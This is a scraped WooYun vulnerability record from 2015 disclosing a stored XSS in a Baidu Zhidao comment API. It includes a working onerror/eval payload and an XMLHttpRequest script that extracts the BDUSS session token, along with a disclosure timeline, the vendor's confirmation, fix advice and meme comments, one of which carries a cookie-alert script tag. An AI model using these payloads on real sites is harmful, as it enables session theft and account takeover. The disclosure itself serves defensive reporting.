{"id": 44630, "wybug_id": "wooyun-2015-099442", "wybug_title": "百度某分站XSS可以得到BDUSS", "wybug_corp": "百度", "wybug_author": "jsbug", "wybug_date": "2015-03-04 18:21", "wybug_open_date": "2015-04-18 18:22", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向公众公开  简要描述： 管理员审核真勤快,刚发就删除,截图都快来不及了. 详细说明：  真相问答机里存在BDUSShttp://zhidao.baidu.com/liuyan/detail?id=5809现在就缺个百度知道的XSS了，o——o！看了下评论，JSON载入，前台页面过滤了。但是JSON请求返回的是text/html，且没过滤<>http://zhidao.baidu.com/api/comment?app=article&thread_id=10000005809&method=get_reply&encoding=gbk&start=0&limit=10&r=1425448854170\n\n接下来就简单了。评论提交：[code]<img src=x onerror=eval(location.hash.slice(1))>[/code]Ajax获取下BDUSS[code]var xmlhttp;if (window.XMLHttpRequest) {  xmlhttp = new XMLHttpRequest();} else {  xmlhttp = new ActiveXObject('Microsoft.XMLHTTP');}xmlhttp.onreadystatechange = function () {  if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {    var res = xmlhttp.responseText;    var a = res.indexOf('BDUSS');    var b = res.indexOf('\"});');    alert(res.substring(a, b));  }}xmlhttp.open('GET', '/liuyan/detail?id=5809', true);xmlhttp.send();[/code]   漏洞证明：  \n\n   修复方案：  返回正确的响应头。过滤。页面不要出现敏感数据。   版权声明：转载请注明来源 jsbug@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-03-05 11:46 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-04 20:40 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-03-04 20:59 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-03-04 21:26 |    \t\tLoveSnow \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 以正和，以奇胜！)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-18 22:33 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:26        | 他们回来了................)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-18 22:37 |    \t\tX5st \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:6        | 合伙搞世界)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~     \n     2015-04-19 09:15 |    \t\t七寸往事 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:17        | <script>alert(document.cookie)</script>)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-19 10:03 |    \t\tX5st \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:6        | 合伙搞世界)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~     \n     2015-04-19 10:37 |    \t\t屠龙宝刀点击就送 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 简要介绍不能为空)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-19 11:59 |    \t\tToom \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 啊)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-19 16:12 |    \t\t刺丶魂 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:9        )\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-20 04:41 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-20 08:35 |    \t\t你大爷在此 百无禁忌 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:6        | Hello 各位小伙伴们 大家好 我是王尼玛)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~     \n     2015-04-20 09:28 |    \t\t小胖纸 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 找人拿指定金融期货原油网站，只要客户资料...)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-20 10:10 |    \t\tLar2y \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 吃口屎冷静一下)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-20 12:42 |    \t\tRPG \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 还要简要介绍)\t\t \n  一开始让我评论你的时候，其实我是拒绝的。我跟大家讲，我拒绝，因为我根本不会评论，大家跟我讲：评完加特技，评论duang～duang～duang～ 我的评论，假的假的是假的，是特技的评论，是乱评的成分，是评论的特技，duang~    \n     2015-04-26 01:36 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  专业破队形    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}